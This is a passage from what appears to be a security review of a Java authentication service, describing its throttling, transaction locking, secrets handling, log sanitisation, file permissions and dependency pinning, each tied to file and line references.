  is the decision, so concurrent attempts cannot all see the same token (`Throttle.java:79-96`); the
  per-account guard is read `FOR UPDATE` (`Throttle.java:151-159`); lockout is temporary and cleared
  by a successful sign-in, so it is not a denial-of-access lever (`Throttle.java:168-199`); the
  expensive paths are metered, including malformed input on sign-in
  (`AuthService.java:134-152`) and duplicate registrations (`AccountStore.java:148-153`); the
  maintenance sweep cannot shorten a denial that is still in force (`Throttle.java:224-250`).
- **Concurrency and atomicity**: autocommit off with a 2-second lock timeout (`Db.java:19-33`), a
  `synchronized` single-connection transaction scope with nesting support and rollback on any
  throwable (`Db.java:157-184`), a documented single lock order, an optimistic
  `password_updated_at` guard on hash upgrade so a concurrent password change is not clobbered
  (`AccountStore.java:204-226`).
- **Secrets handling**: no credential, key or password literal anywhere in `src/main` or the tests;
  the database password comes only from `APP_DB_PASSWORD` or a 0600 `APP_DB_PASSWORD_FILE` with a
  16-character minimum and mutual exclusion (`Config.java:178-226`); no credential is accepted as a
  command-line argument, including the session cookie (`Main.java:363-368`); secrets are held in
  `char[]`, erased in `finally` blocks, and `Secrets.toString()` is redacted
  (`Secrets.java:53-65`, `Main.java:229-233`, `:257-260`, `:336-338`, `:387-389`). The residual
  `String` copy is SEC-03.
- **Log hygiene**: the audit vocabulary is a fixed enum, values are code-supplied constants or
  per-process-salted digests, keys are sanitised and values JSON-escaped and length-bounded, so
  neither log injection nor credential leakage into the trail is possible
  (`AuditLog.java:44-65`, `:211-252`, `Gate.java:33-74`); passwords, raw tokens and the unsalted
  token SHA-256 are never written (`Gate.java:59-70`).
- **File permissions**: data directory forced to 0700 and refused if world-writable, store file
  pre-created 0600 and refused if wider, audit log created with the mode passed to `createFile` and
  refused if not owner-only, with symlinks rejected at every step and `NOFOLLOW_LINKS` on the audit
  append (`Config.java:281-370`, `AuditLog.java:183-209`). The residual races are SEC-06.
- **Error and exception exposure**: no stack trace or SQL text reaches the user; `RuntimeException`
  is caught and reduced to a generic line plus the exception class name, and H2's trace file is
  disabled (`Main.java:133-160`, `Config.java:70-71`).
- **Deserialization, path traversal, command execution, SSRF, XSS/XXE**: none present — no
  `ObjectInputStream`/`readObject`, no XML or YAML parsing, no `Runtime.exec`/`ProcessBuilder`, no
  outbound HTTP client, no template or HTML rendering in the application code. The only filesystem
  paths come from configuration and are normalised and symlink-checked; the only file name derived
  from input is none.
- **Supply chain**: three runtime/test jars pinned by SHA-256 in `deps.lock`, fetched over TLS 1.2+
  from Maven Central, cross-checked against an independent distributor and the published SHA-1,
  verified to contain the expected class entry, and signature-checked where marked `signed`
  (`scripts/get-deps.sh:22-83`); the test-only Spring jar is deliberately kept off the runtime
  classpath (`scripts/build.sh:11-14`, `scripts/run.sh:9-11`).
- **Rate-limit source identity**: derived from the kernel-maintained effective uid in
  `/proc/self/status` rather than the forgeable `user.name` system property, and degraded to a single
  *shared* bucket (never a fresh one) when unreadable (`Main.java:392-445`).
